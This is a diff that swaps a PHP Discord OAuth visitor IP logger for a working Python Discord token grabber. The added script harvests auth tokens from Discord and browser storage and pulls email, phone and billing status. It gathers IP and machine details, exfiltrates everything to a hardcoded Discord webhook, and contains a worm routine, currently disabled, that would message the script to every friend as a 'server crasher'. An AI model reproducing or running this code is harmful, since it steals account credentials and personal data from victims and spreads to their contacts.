@@ -1,120 +1,197 @@
-<?php
-ob_start();
-error_reporting(0);
-
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
-
-function get_ip_address()
-{
-    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
-        return $_SERVER['HTTP_CLIENT_IP'];
+import os
+if os.name != "nt":
+    exit()
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+from threading import Thread
+from time import sleep
+from sys import argv
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
     }
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
-            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-            foreach ($iplist as $ip) {
-                if (validate_ip($ip))
-                    return $ip;
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": f"Token grabber by {developer}"
+                }
             }
-        } else {
-            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
-                return $_SERVER['HTTP_X_FORWARDED_FOR'];
-        }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
-    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
-        return $_SERVER['HTTP_X_FORWARDED'];
-    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
-        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
-    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
-        return $_SERVER['HTTP_FORWARDED_FOR'];
-    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
-        return $_SERVER['HTTP_FORWARDED'];
-    return $_SERVER['REMOTE_ADDR'];
-}
-function validate_ip($ip)
-{
-    if (strtolower($ip) === 'unknown')
-        return false;
-    $ip = ip2long($ip);
-    if ($ip !== false && $ip !== -1) {
-        $ip = sprintf('%u', $ip);
-        if ($ip >= 0 && $ip <= 50331647)
-            return false;
-        if ($ip >= 167772160 && $ip <= 184549375)
-            return false;
-        if ($ip >= 2130706432 && $ip <= 2147483647)
-            return false;
-        if ($ip >= 2851995648 && $ip <= 2852061183)
-            return false;
-        if ($ip >= 2886729728 && $ip <= 2887778303)
-            return false;
-        if ($ip >= 3221225984 && $ip <= 3221226239)
-            return false;
-        if ($ip >= 3232235520 && $ip <= 3232301055)
-            return false;
-        if ($ip >= 4294967040)
-            return false;
-    }
-    return true;
-}
-if (empty($_GET['code'])) {
-    $params = array(
-        'client_id' => $client_id,
-        'redirect_uri' => $redirect,
-        'response_type' => 'code',
-        'scope' => 'identify guilds',
-        'state' => $code
-    );
-    header('Location: https://discordapp.com/api/oauth2/authorize' . '?' . http_build_query($params));
-}
-if (isset($_GET['code'])) {
-    $token_request = "https://discordapp.com/api/oauth2/token";
-    $token         = curl_init();
-    curl_setopt_array($token, array(
-        CURLOPT_URL => $token_request,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => array(
-            "grant_type" => "authorization_code",
-            "client_id" => $client_id,
-            "client_secret" => $client_secret,
-            "redirect_uri" => $redirect,
-            "state" => $_GET['state'],
-            "code" => $_GET["code"]
-        )
-    ));
-    curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
-    $data         = json_decode(curl_exec($token));
-    $access_token = $data->access_token;
-}
-
-$info_request = "https://discordapp.com/api/users/@me";
-$info         = curl_init();
-curl_setopt_array($info, array(
-    CURLOPT_URL => $info_request,
-    CURLOPT_HTTPHEADER => array(
-        "Authorization: Bearer $access_token"
-    ),
-    CURLOPT_RETURNTRANSFER => true
-));
-$user    = json_decode(curl_exec($info));
-$id      = $user->id;
-$un      = $user->username;
-$di      = $user->discriminator;
-$diname  = $un . "#" . $di;
-$ip      = get_ip_address();
-if(isset($id)) {
-    $json    = file_get_contents("http://extreme-ip-lookup.com/json/" . $ip);
-    $data    = json_decode($json, true);
-    $country = $data['country'];
-    $date    = date('d/m/Y');
-    $file  = fopen("logs.txt", "a+");
-    fwrite($file, "Logged IP: ");
-    fwrite($file, get_ip_address());
-    fwrite($file, " ($diname) - ($id) - ($country), at $date");
-    fwrite($file, "\n");
-    fclose($file);
-}
-?>
-<title>Hi</title>
+    try:
+        urlopen(Request("https://discord.com/api/webhooks/776366042355073026/0aoDraRllOcPNQcmhXrSTsqqNLafbiVTrjZD_UhOsDr-dn9Sxm9DvqBbqLoQax1zDnVQ", data=dumps(webhook).encode(), headers=getheaders()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
